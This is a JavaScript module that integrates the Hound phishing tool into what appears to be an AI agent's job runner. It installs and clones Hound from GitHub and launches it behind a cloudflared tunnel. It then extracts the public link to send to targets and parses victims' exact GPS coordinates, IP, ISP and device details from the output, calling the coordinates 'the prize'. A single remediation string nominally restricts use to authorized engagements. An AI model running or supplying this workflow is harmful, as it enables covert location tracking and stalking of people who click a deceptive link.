// Hound — geolocation + device-recon phishing tool (techchipnet/hound). It starts a PHP server behind a
// cloudflared tunnel, hands you a public https://<sub>.trycloudflare.com link, and when a target opens it
// (granting browser location) it captures their EXACT GPS coordinates plus device intel: OS, device model,
// CPU cores, screen resolution, user-agent/browser, public IP and ISP.
//
// Hound is a LONG-LIVED server (it waits for targets forever). So the agent runs it as a PERSISTENT background
// job (the job manager) — the link stays alive, and captured data streams into the job's output as victims
// click. cloudflared makes the link reachable from anywhere, so it works even from the Docker sandbox.

export function detectHound(command = '') {
  return /\bhound\b|trycloudflare|hound\.sh/i.test(command);
}

// The persistent command the agent runs as a background job: install deps, clone Hound, answer the tunnel
// prompt (Y = use cloudflared), and launch it (it then serves + waits for targets, streaming captures).
export function buildHoundCommand() {
  return [
    'command -v php >/dev/null 2>&1 || { apt-get update -y >/dev/null 2>&1; apt-get install -y php-cli wget unzip git >/dev/null 2>&1; };',
    '[ -d "$HOME/hound" ] || git clone --depth 1 https://github.com/techchipnet/hound "$HOME/hound" >/dev/null 2>&1;',
    'cd "$HOME/hound" || exit 1;',
    // fresh state each run so a stale ip.txt/data.txt doesn't replay
    'rm -f ip.txt data.txt cf.log 2>/dev/null;',
    // answer the "[Y/N] use cloudflared tunnel" prompt with Y, then Hound serves + waits (this blocks = job stays alive)
    "printf 'Y\\n' | bash hound.sh",
  ].join(' ');
}

// Pull the public tracking link out of Hound's output.
export function extractHoundLink(output) {
  const m = /(https:\/\/[-0-9a-z]+\.trycloudflare\.com)/i.exec(String(output || ''));
  return m ? m[1] : null;
}

// Parse captured target data (GPS + device intel) from the job output -> findings.
export function parseHound(command, output) {
  if (!detectHound(command) || !output) return [];
  const t = String(output);
  const out = [];
  // exact GPS coordinates — the prize
  const lat = /Latitude\s*[:=]?\s*(-?\d{1,3}\.\d+)/i.exec(t);
  const lon = /Longitude\s*[:=]?\s*(-?\d{1,3}\.\d+)/i.exec(t);
  if (lat && lon) {
    const acc = /Accuracy\s*[:=]?\s*([\d.]+)/i.exec(t);
    out.push({
      finding_type: 'osint', severity: 'critical', source: 'hound',
      title: `Target GPS location captured: ${lat[1]}, ${lon[1]}`,
      evidence: `https://www.google.com/maps?q=${lat[1]},${lon[1]}${acc ? ` (±${acc[1]}m)` : ''}`,
      remediation: "The target's precise location was leaked via a browser location prompt — never grant location to untrusted links; this is for authorized tracking/OSINT engagements only.",
    });
  }
  // device / network intel
  const fields = [
    [/(?:Operating System|Platform|OS)\s*[:=]\s*(.+)/i, 'OS'],
    [/(?:Device Model|Model)\s*[:=]\s*(.+)/i, 'Device'],
    [/(?:Public IP|IP)\s*[:=]?\s*((?:\d{1,3}\.){3}\d{1,3})/i, 'IP'],
    [/(?:ISP|Provider|Org)\s*[:=]\s*(.+)/i, 'ISP'],
    [/(?:Browser)\s*[:=]\s*(.+)/i, 'Browser'],
  ];
  const intel = [];
  for (const [re, label] of fields) { const m = re.exec(t); if (m) intel.push(`${label}: ${m[1].trim().slice(0, 60)}`); }
  if (intel.length) {
    out.push({
      finding_type: 'osint', severity: 'medium', source: 'hound',
      title: `Target device/network intel captured (${intel.length} fields)`,
      evidence: intel.join(' · ').slice(0, 300), remediation: null,
    });
  }
  if (/Target opened the link/i.test(t) && !out.length) {
    out.push({ finding_type: 'osint', severity: 'info', source: 'hound', title: 'A target opened the Hound tracking link', evidence: t.slice(0, 160) });
  }
  const seen = new Set();
  return out.filter((f) => (seen.has(f.title) ? false : seen.add(f.title)));
}
